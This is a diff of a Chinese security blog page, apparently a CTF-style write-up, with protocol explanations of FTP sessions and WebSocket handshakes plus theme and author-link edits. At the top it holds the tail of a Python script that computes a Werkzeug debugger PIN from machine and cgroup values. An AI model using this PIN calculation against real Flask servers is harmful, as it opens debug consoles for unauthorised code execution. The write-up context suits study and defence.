+    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span><span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>总之需要的文件就是</p>
 <blockquote>
@@ -580,7 +616,36 @@
 </tr>
 </tbody></table>
 <p>下面是一次正常的FTP连接的双方数据交互的过程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">响应: 	220 (vsFTPd 3.0.2)</span><br><span class="line">命令: 	AUTH TLS</span><br><span class="line">响应: 	530 Please login with USER and PASS.</span><br><span class="line">命令: 	AUTH SSL</span><br><span class="line">响应: 	530 Please login with USER and PASS.</span><br><span class="line">状态: 	不安全的服务器，不支持 FTP over TLS。</span><br><span class="line">命令: 	USER test</span><br><span class="line">响应: 	331 Please specify the password.</span><br><span class="line">命令: 	PASS ****</span><br><span class="line">响应: 	230 Login successful.</span><br><span class="line">命令: 	OPTS UTF8 ON</span><br><span class="line">响应: 	200 Always in UTF8 mode.</span><br><span class="line">命令: 	CWD /</span><br><span class="line">响应: 	250 Directory successfully changed.</span><br><span class="line">命令: 	PWD</span><br><span class="line">响应: 	257 &quot;/&quot;</span><br><span class="line">命令: 	TYPE A</span><br><span class="line">响应: 	200 Switching to ASCII mode.</span><br><span class="line">命令: 	PASV</span><br><span class="line">响应: 	227 Entering Passive Mode (172,17,0,6,82,117).</span><br><span class="line">命令: 	STOR main.py</span><br><span class="line">响应: 	150 Ok to send data.</span><br><span class="line">响应: 	226 Transfer complete.</span><br><span class="line">命令: 	TYPE I</span><br><span class="line">响应: 	200 Switching to Binary mode.</span><br><span class="line">命令: 	PASV</span><br><span class="line">响应: 	227 Entering Passive Mode (172,17,0,6,82,111).</span><br><span class="line">命令: 	LIST</span><br><span class="line">响应: 	150 Here comes the directory listing.</span><br><span class="line">响应: 	226 Directory send OK.</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">响应: 	220 (vsFTPd 3.0.2)
+命令: 	AUTH TLS
+响应: 	530 Please login with USER and PASS.
+命令: 	AUTH SSL
+响应: 	530 Please login with USER and PASS.
+状态: 	不安全的服务器，不支持 FTP over TLS。
+命令: 	USER test
+响应: 	331 Please specify the password.
+命令: 	PASS ****
+响应: 	230 Login successful.
+命令: 	OPTS UTF8 ON
+响应: 	200 Always in UTF8 mode.
+命令: 	CWD &#x2F;
+响应: 	250 Directory successfully changed.
+命令: 	PWD
+响应: 	257 &quot;&#x2F;&quot;
+命令: 	TYPE A
+响应: 	200 Switching to ASCII mode.
+命令: 	PASV
+响应: 	227 Entering Passive Mode (172,17,0,6,82,117).
+命令: 	STOR main.py
+响应: 	150 Ok to send data.
+响应: 	226 Transfer complete.
+命令: 	TYPE I
+响应: 	200 Switching to Binary mode.
+命令: 	PASV
+响应: 	227 Entering Passive Mode (172,17,0,6,82,111).
+命令: 	LIST
+响应: 	150 Here comes the directory listing.
+响应: 	226 Directory send OK.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="WEBSOCKET"><a href="#WEBSOCKET" class="headerlink" title="WEBSOCKET"></a>WEBSOCKET</h3><p>HTTP协议有一个的缺陷为：通信只能由客户端发起。在一些场景下，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BD%AE%E8%AF%A2&spm=1001.2101.3001.7020">轮询</a>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。轮询效率低切浪费资源，此时，websocket就被发明了</p>
 <p>Webscoket是Web浏览器和服务器之间的一种全双工通信协议，其中WebSocket协议由IETF定为标准，WebSocket API由W3C定为标准。一旦Web客户端与服务器建立起连接，之后的全部数据通信都通过这个连接进行。通信过程中，可互相发送JSON、XML、HTML或图片等任意格式的数据。</p>
@@ -600,7 +665,29 @@
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20200527233222508.png" alt="img"></p>
 <p>这里是一个完整的websocket的过程数据流</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: localhost:3000</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Accept: */*</span><br><span class="line">Sec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw==</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Accept-Language: zh-CN,zh-Hans;q=0.9</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: null</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: websocket</span><br><span class="line"></span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL/vprw=</span><br><span class="line"></span><br><span class="line">..&quot;c_.Z</span><br><span class="line">&gt;.Q</span><br><span class="line">..ECHO: xiaosi..&quot;|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...&gt;...5...ECHO: xiaosi</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1
+Host: localhost:3000
+Pragma: no-cache
+Accept: *&#x2F;*
+Sec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw&#x3D;&#x3D;
+Sec-WebSocket-Version: 13
+Accept-Language: zh-CN,zh-Hans;q&#x3D;0.9
+Sec-WebSocket-Extensions: permessage-deflate
+Cache-Control: no-cache
+Accept-Encoding: gzip, deflate
+Origin: null
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko) Version&#x2F;15.5 Safari&#x2F;605.1.15
+Connection: Upgrade
+Upgrade: websocket
+
+HTTP&#x2F;1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL&#x2F;vprw&#x3D;
+
+..&quot;c_.Z
+&gt;.Q
+..ECHO: xiaosi..&quot;|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...&gt;...5...ECHO: xiaosi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
 <li>第一行为为请求的方法，类型必须为GET，协议版本号必须大于1.1</li>
@@ -637,7 +724,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -660,7 +747,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -703,39 +790,6 @@
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -787,7 +841,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -824,7 +878,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -843,6 +897,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -951,69 +1008,15 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -1048,7 +1051,7 @@
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -1056,10 +1059,8 @@
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -1068,9 +1069,7 @@
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1230,6 +1229,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1256,8 +1263,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
